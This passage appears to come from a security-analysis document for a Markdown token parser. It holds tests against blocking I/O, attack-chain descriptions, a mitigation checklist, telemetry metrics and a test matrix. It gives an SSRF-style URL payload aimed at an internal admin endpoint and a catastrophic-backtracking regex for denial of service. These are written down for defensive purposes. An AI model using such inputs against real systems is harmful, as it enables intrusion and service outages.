def test_no_blocking_io_in_collectors():
    """Verify collectors don't perform blocking I/O."""
    import unittest.mock as mock

    # Mock all blocking I/O functions to raise
    with mock.patch('requests.get', side_effect=AssertionError("Blocking HTTP in collector!")):
        with mock.patch('urllib.request.urlopen', side_effect=AssertionError("Blocking HTTP in collector!")):
            with mock.patch('builtins.open', side_effect=AssertionError("Blocking file I/O in collector!")):

                # Dispatch should not trigger any I/O
                wh = TokenWarehouse(tokens, None)
                wh.register_collector(LinksCollector())
                wh.dispatch_all()  # Should not raise

def test_dispatch_performance_threshold():
    """Verify dispatch completes quickly (no blocking I/O)."""
    import time

    tokens = generate_test_tokens(1000)  # 1000 tokens

    start = time.perf_counter()
    wh = TokenWarehouse(tokens, None)
    wh.register_collector(LinksCollector())
    wh.dispatch_all()
    elapsed = time.perf_counter() - start

    # Should complete in < 10ms (1000 tokens @ <0.01ms each)
    assert elapsed < 0.01, f"Dispatch too slow: {elapsed * 1000}ms (blocking I/O?)"
```

---

## Combined Attack Examples (Chains)

### Chain 1: Normalization + SSRF

**Attack flow**:
1. Token contains URL that looks safe to collector (percent-encoded): `http://example.com%00@127.0.0.1/admin`
2. Collector's naive check: `url.split(':')[0] == 'http'` → ✓ PASS
3. Centralized normalizer in fetcher decodes: `http://127.0.0.1/admin`
4. Previewer (not sandboxed) visits internal admin endpoint
5. Attacker exfiltrates secret via **timing side-channel** (response time differs for valid/invalid credentials)

**Mitigation**: Normalize centrally + use hardened fetcher + reject ambiguous inputs

---

### Chain 2: Poisoned Token + Regex DoS

**Attack flow**:
1. Compromised plugin returns tokens whose `content` is crafted to trigger **catastrophic backtracking** in a collector regex
2. Collector regex: `r'^(a+)+$'` matches `content = 'aaaaaaaaaa...X'` → O(2^N) time
3. CPU spike → service hangs → **timing leak reveals secret** (which requests caused hang)

**Mitigation**: Canonicalize token views + clamp content sizes + avoid backtracking regexes

---

## Immediate Detection & Mitigations (Practical Checklist)

### ✅ Priority 1: Canonicalization & Limits
```python
# Already documented in TOKEN_VIEW_CANONICALIZATION.md
- [ ] Canonicalize tokens to primitive TokenView (closes supply-chain attacks)
- [ ] Enforce MAX_TOKENS, MAX_BYTES, MAX_NESTING (fail early on huge inputs)
```

### ✅ Priority 2: URL Security
```python
- [ ] Normalize URLs centrally (punycode, percent-decode, lowercase scheme)
- [ ] Use same normalization in collector AND fetcher (test consistency)
- [ ] Reject control chars, NULL bytes, protocol-relative URLs
```

### ✅ Priority 3: Template Safety
```python
- [ ] Escape all user content before rendering
- [ ] Add `contains_template_syntax` flag at collection time
- [ ] Use safe template engines (autoescape=True)
```

### ✅ Priority 4: Algorithmic Complexity
```python
- [ ] Replace O(N²) patterns with hash-based structures (sets, dicts)
- [ ] Use warehouse indices (by_type) instead of linear scans
- [ ] Add collector caps (MAX_ITEMS_PER_TYPE)
```

### ✅ Priority 5: Deep Nesting
```python
- [ ] Enforce MAX_NESTING limit in __init__
- [ ] Use iterative algorithms (no recursion)
- [ ] Compact parent maps (int indices, not object stacks)
```

### ✅ Priority 6: Determinism
```python
- [ ] Sort token types before bit mapping
- [ ] Test with randomized plugin load order
- [ ] Add startup consistency check (compare mapping to baseline)
```

### ✅ Priority 7: GC Thrash
```python
- [ ] Use list.append() + "".join() for string building
- [ ] Preallocate lists when counts known
- [ ] Profile allocations (tracemalloc) and optimize hotspots
```

### ✅ Priority 8: Thread Safety
```python
- [ ] Make registration startup-only (freeze after first dispatch)
- [ ] Make routing immutable (freeze to tuples)
- [ ] Document: collectors MUST NOT mutate shared state
- [ ] Run concurrency stress tests
```

---

## Telemetry & Monitoring

### Key Metrics:
```python
metrics = {
    # Resource
    "tokens_per_parse": len(tokens),
    "parse_duration_ms": elapsed * 1000,
    "peak_memory_mb": peak / 1024 / 1024,

    # Security
    "collector_errors": len(wh._collector_errors),
    "unsafe_urls": sum(1 for l in links if not l["allowed"]),
    "template_syntax_detected": sum(1 for h in headings if h.get("has_template_syntax")),
    "control_chars_detected": sum(1 for l in links if CONTROL_CHARS.search(l["url"])),

    # Performance
    "algorithmic_complexity_score": estimate_complexity(tokens),
    "max_nesting_depth": max(tok.nesting for tok in tokens),
    "gc_pause_ms": gc.get_stats()["pause_ms"],
}
```

### Alert Thresholds:
- `tokens_per_parse > 100K` → Large document
- `collector_errors > 0` → Collector failure
- `unsafe_urls > 0` → Security issue
- `template_syntax_detected > 0` → Review needed
- `max_nesting_depth > 1000` → Deep nesting risk
- `gc_pause_ms > 100` → GC thrash

---

## Testing Matrix

| Vulnerability | Test File | Priority |
|--------------|-----------|----------|
| Token deserialization | `test_supply_chain.py` | 🔴 P1 |
| URL normalization | `test_url_security.py` | 🔴 P1 |
| Template injection | `test_template_safety.py` | 🟠 P2 |
| Side-channel timing | `test_isolation.py` | 🟡 P3 |
| Algorithmic complexity | `test_performance.py` | 🟠 P2 |
| Deep nesting | `test_limits.py` | 🟡 P3 |
| Bitmask determinism | `test_determinism.py` | 🟡 P3 |
| GC thrash | `test_memory.py` | 🟡 P3 |
| Race conditions | `test_concurrency.py` | 🟡 P3 |

---

## References

### Related Documentation
- `ATTACK_SCENARIOS_AND_MITIGATIONS.md` - Basic attack scenarios
- `SECURITY_QUICK_REFERENCE.md` - Fast security checklist
- `TOKEN_VIEW_CANONICALIZATION.md` - Implementation guide

### External Resources
- OWASP: Server-Side Template Injection
- CWE-918: Server-Side Request Forgery (SSRF)
- Python Security Best Practices

---

**Last Updated**: 2025-10-15
**Status**: Advanced security analysis complete
**Next Step**: Apply Priority 1-8 mitigations from checklist

